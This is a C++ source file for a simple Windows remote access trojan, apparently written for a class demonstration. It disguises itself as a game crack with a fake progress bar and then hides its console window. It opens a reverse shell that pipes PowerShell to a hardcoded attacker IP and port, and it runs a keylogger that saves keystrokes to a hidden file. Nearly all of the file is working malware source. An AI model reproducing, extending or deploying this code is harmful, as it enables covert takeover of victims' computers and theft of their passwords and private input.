/*
By: Eduardo Corazon
Date: 11/25/2022
Decription: This is a simple RAT with keylogging functionality written in C++,
            it's to be used exclusively for demonstration purposes

Refferences: https://stackoverflow.com/questions/21582448/creating-a-loading-animation
             https://www.youtube.com/watch?v=J0nWQRqb3Fc
             https://www.youtube.com/watch?v=6f1GUyY9TYE
             https://github.com/izenynn/c-reverse-shell
             https://www.tutorialspoint.com/cplusplus/cpp_preprocessor.htm
*/

/* 
############################# WARNING #######################################
I am NOT responsible for ANY misuse of this product
PLEASE DO NOT USE THIS FOR NEFARIOUS / ILLEGAL PURPOSES
This product is intented to be simplistic & for a class desmonstration, 
it is not a fully featured Malware product.
#############################################################################
*/


//Libraries to use
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <bits/stdc++.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <string>
#pragma comment(lib,"ws2_32") //For Socket



/*------------------------- THESE ARE THE THINGS WE CAN CHANGE ---------------------------------*/
# define CLIENT_IP (char*)"172.16.42.122" //our Attackers IP
# define CLIENT_PORT (int)1234 //Our listening port
# define LOG_FILE "dependencies.txt" //The name of the log file for the keylogger & it's location
//Note* by default, the log file is made with the windows hidden attribute
/*----------------------------------------------------------------------------------------------*/



//The sections below define the functions for their respective use
//Instead of "using namespace std" each part will have its own namespace (std::string) to avoid future errors


/*################ TROJAN #####################*/
//For the "legitamate software" aspect our malware we will make Kellog appear to be a game cracker
//This is becuase it's very unlikely any user would actually run an .exe file if they don't know what it is

void Trojan(){
    //Banner
    printf("___________                      __             .______________.__          __                    \n");
    printf("\\_   _____/______  ____  _______/  |_  ____   __| _/\\_   _____/|  | _____  |  | __ ____   ______  \n");
    printf(" |    __) \\_  __ \\/  _ \\/  ___/\\   __\\/ __ \\ / __ |  |    __)  |  | \\__  \\ |  |/ // __ \\ /  ___/  \n");
    printf(" |     \\   |  | \\(  <_> )___ \\  |  | \\  ___// /_/ |  |     \\   |  |__/ __ \\|    <\\  ___/ \\___ \\  \n");
    printf(" \\___  /   |__|   \\____/____  > |__|  \\___  >____ |  \\___  /   |____(____  /__|_ \\\\___  >____  >  \n");
    printf("     \\/                     \\/            \\/     \\/      \\/              \\/     \\/    \\/     \\/  \n");

    printf("\n");
    printf("Now downloading crack for the secret game 'Frosted Flakes' \nThis Terminal will automatically close when finished.\nPlease be patient... \n");
    printf("\n");
    
    
    //Fake a Progress bar
    #define PROGRESS_BAR_SIZE 40

    //since we can't have a function inside a function in c++, we use lambdas & pass everything in the capture list with &
    auto print_n_chars= [&](int n, int c) {
        while (n-- > 0) putchar(c);
    };

    auto display_progress_bar = [&](int p) {
        putchar('\r');
        putchar('[');
        print_n_chars(PROGRESS_BAR_SIZE * p / 100, '#');
        print_n_chars(PROGRESS_BAR_SIZE - PROGRESS_BAR_SIZE * p / 100, ' ');
        putchar(']');
    };

    int p;
    for (p = 0; p <= 100; ++p) {
        display_progress_bar(p);
        Sleep(50);
    }
    //Indicate it's done
    printf("\n");
    printf("\nDone! \nThis Terminal will automatically close in a couple of seconds!\nGive it a minute to finalize the crack ... \n ");
    Sleep(5000); //close after 5 seconds
}


/*################ KEYLOGGER #####################*/
void Keylogger(){
    auto saveData = [](std::string data){
        std::fstream logFile;

        logFile.open(LOG_FILE, std::ios::app); //open the log file and append data (std::ios::app)
        logFile << data; //writes they keyboard input data into the logfile
        logFile.close(); //close the file

        //Now that the file is made, we need to hide it. Idealy we would move it around to a system folder
        //or use other methods but for a simple demonstration, we'll simply add the "hidden file" attribute on windows
        const wchar_t* fileLPCWSTR = L"dependencies.txt";
        int attr = GetFileAttributes(fileLPCWSTR);
        if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
        SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
            }
       
    };
    //Handle special characters
        auto SpecialKeyHandle = [](int key){
            std::string result;

            switch (key){
            case VK_BACK:
                result = "[BACKSPACE]"; //backspace
                break;
            case VK_CAPITAL:
                result = "[CAPS_LOCK]"; //CAPSLOCK 
                break;
            case VK_SHIFT:
                result = "[SHIFT]"; //Shift key
                break;
            case VK_TAB:
                result = "[TAB]"; //Tab key
                break;
            default:
                break;
            }

            return result;
        };

    //The "main" code for the Keylogger
    while (true){ //While(true) creates an infinite loop that won't stop until it's explicitly broken

        //Used to avoid error with string to char conversion during compile
        int SpecialKeyArray[] = {VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB};
        std::string SpecialKeyChar;
        bool isSpecial; //indicates if the key pressed is a special key

        //this is the common code in all the keyloggers written in C
        for(int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767){
                //once we get the key input we should verify if it's a special character
                isSpecial = std::find(std::begin(SpecialKeyArray), std::end(SpecialKeyArray), key) != std::end(SpecialKeyArray);

                if (isSpecial){
                    SpecialKeyChar = SpecialKeyHandle(key);
                    saveData(SpecialKeyChar);
                }

                else{
                    if (GetKeyState(VK_CAPITAL)){
                        saveData(std::string(1, (char)key));
                    }
                    else{
                        saveData(std::string(1, (char)std::tolower(key)));

                    }
                }

                
            }
        }
    }

    
}
/*################ REVERSE SHELL #####################*/
int RevShell(void){

    //Check to makesure the the Socket started correctly
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa; //Used to handle the internet address, refer to https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html
    //Create an IPv4 (AF_NET) TCP (SOCK_STREAM) connection
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

    //This is used while we wait for the connection to be established
    #ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
    #else
    //if it takes too long to connect the indicate it fialed 
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] The crack experienced a problem, please try running it again.\n", 24);
		return (1);
	}
    #endif
    //Creates the background process and runs the socket, refer to https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
	STARTUPINFOA sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
    //have to set "cmd" to a modifiable array else the error:
    //iso forbids converting string constant to lpstr -wwrite-strings (aka char*)
	char PowerShell[]= "PowerShell";
	CreateProcessA(NULL,PowerShell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    return 0;
    
}
/*########################################### MAIN FUNCTION #####################################################*/
// define the main function signature
// **look at this when rev engineering
int main (int argc, char *argv[]){ 
    Trojan(); //This will make our exe look "legit"
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //This hides the terminal windows when run as administrator
    RevShell(); //spawn a netcat reverse shell
    Keylogger(); //run the keylogger
}
